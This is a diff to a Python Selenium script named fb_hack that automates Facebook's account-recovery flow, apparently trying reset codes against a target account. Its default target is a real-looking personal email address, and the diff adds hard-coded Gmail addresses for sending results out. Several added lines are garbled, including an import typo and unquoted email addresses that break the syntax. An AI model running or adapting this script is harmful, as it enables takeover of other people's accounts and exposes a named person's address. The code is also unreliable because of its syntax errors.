@@ -1,3 +1,4 @@
+from selenium.webdriver.commom.by import By
 from selenium import webdriver
 from time import sleep
 from bs4 import BeautifulSoup
@@ -36,11 +37,11 @@ def fb_hack(email, codex, respect):
   html = driver.page_source
   soup = BeautifulSoup(html, 'html.parser')
   #wait = WebDriverWait(driver, 10)
-  #element = wait.until(EC.visibility_of_element_located((By.ID, "element_id")))
-  search_box = driver.find_element(By.NAME, "email")
+  #element = wait.until(EC.visibility_of_element_located((by = By.ID, "element_id")))
+  search_box = driver.find_element(by = By.NAME, value = "email")
   search_box.send_keys(email)
   search_box.submit()
-  search_button = driver.find_element(By.NAME, "tryanotherway")
+  search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
   search_button.click()
   driver.submit()
   "make respect properly"
@@ -61,7 +62,7 @@ def fb_hack(email, codex, respect):
       print("working", end='\r')
     else:
       try:
-        searchbox = driver.find_element(By.NAME, "n")
+        searchbox = driver.find_element(by=By.NAME, value="n")
         searchbox.send_keys(p)
         searchbox.submit()
       except:
@@ -77,8 +78,8 @@ def fb_hack(email, codex, respect):
       h = " "
       yo = h.join(code1)
       yot = h.join(code2)
-      response1 = browser.response()
-      soup = BeautifulSoup(response1, 'html.parser')
+      html = driver.page_source
+      soup = BeautifulSoup(html, 'html.parser')
       taw = soup.find(string="Try another way")
       if taw != "None":
         print(yo)
@@ -94,8 +95,8 @@ os.system('clear')
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
 reset = int(input('Code: ') or 1)
 past = int(input('Length: ') or 6)
-sender_email = input("Your Email:")
-receiver_email = input("Recipient:")
+sender_email = input("Your Email:") or krarktel@gmail.com
+receiver_email = input("Recipient:") ppteam36884@gmail.com
 password = input("Type your password and press enter:")
 while past >= 6:
   fb_hack(ehack, reset, past)
